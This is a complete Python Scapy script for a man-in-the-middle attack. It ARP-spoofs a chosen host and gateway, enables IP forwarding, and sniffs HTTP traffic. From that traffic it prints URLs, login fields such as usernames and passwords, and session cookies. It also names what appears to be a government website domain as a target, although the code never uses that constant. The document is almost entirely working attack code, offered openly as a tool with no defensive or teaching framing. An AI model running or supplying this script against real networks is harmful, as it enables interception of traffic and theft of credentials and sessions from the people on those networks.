#!/usr/bin/env python3
"""
MITM Scapy Script
Author: Your Name
Description: Performs ARP spoofing and packet sniffing to capture HTTP traffic.
License: MIT
"""

from scapy.all import *
import os
import threading
import time
import re

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Target website domain
TARGET_DOMAIN = "www.ostan-ks.ir"

# Function to enable IP forwarding (Linux only)
def enable_ip_forwarding():
    print("[+] Enabling IP Forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
            file.write("1")
    except PermissionError:
        print("[!] Error: Insufficient permissions to enable IP forwarding. Run the script with 'sudo'.")

# Function to restore network settings
def restore_network(target_ip, gateway_ip):
    print("[+] Restoring network settings...")
    try:
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        if target_mac and gateway_mac:
            send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip), count=4, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip), count=4, verbose=False)
    except Exception as e:
        print(f"[!] Error restoring network: {e}")

# Function to perform ARP spoofing
def arp_spoof(target_ip, gateway_ip):
    try:
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        if not target_mac or not gateway_mac:
            raise ValueError("Could not retrieve MAC addresses.")
        print(f"[+] Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)
    except Exception as e:
        print(f"[!] Error during ARP spoofing: {e}")
        restore_network(target_ip, gateway_ip)

# Function to process packets captured by Scapy
def process_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 80 or packet[TCP].sport == 80:  # HTTP traffic
            load = packet[Raw].load.decode(errors='ignore')
            
            # Extract URL
            url = get_url(packet)
            if url:
                print(f"[+] Detected URL: {url}")
            
            # Extract credentials
            credentials = extract_credentials(load)
            if credentials:
                print(f"[+] Detected Credentials: {credentials}")
            
            # Extract cookies
            cookies = extract_cookies(load)
            if cookies:
                print(f"[+] Detected Cookies: {cookies}")

# Function to extract the URL from an HTTP request
def get_url(packet):
    raw_load = packet[Raw].load.decode(errors='ignore')
    url = re.search(r"(?i)\bhttps?://[^\s]+", raw_load)
    if url:
        return url.group(0)
    return None

# Function to extract credentials from a POST request
def extract_credentials(load):
    fields = ["username", "password", "email", "login", "user", "pass"]
    credentials = {}
    for field in fields:
        match = re.search(f"{field}=([^&]*)", load)
        if match:
            credentials[field] = match.group(1)
    return credentials if credentials else None

# Function to extract cookies from an HTTP request/response
def extract_cookies(load):
    cookie_match = re.search(r"Cookie:\s*(.*?)\r\n", load, re.IGNORECASE)
    if cookie_match:
        return cookie_match.group(1)
    return None

# Main function
if __name__ == "__main__":
    target_ip = "192.168.1.10"  # Replace with the target's IP address
    gateway_ip = "192.168.1.1"  # Replace with the gateway's IP address

    try:
        enable_ip_forwarding()
        print(f"[+] Starting ARP spoofing against {target_ip}...")
        arp_spoof_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip), daemon=True)
        arp_spoof_thread.start()

        print("[+] Starting packet sniffing...")
        sniff(filter="tcp port 80", prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C... Restoring network settings...")
        restore_network(target_ip, gateway_ip)
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        restore_network(target_ip, gateway_ip)
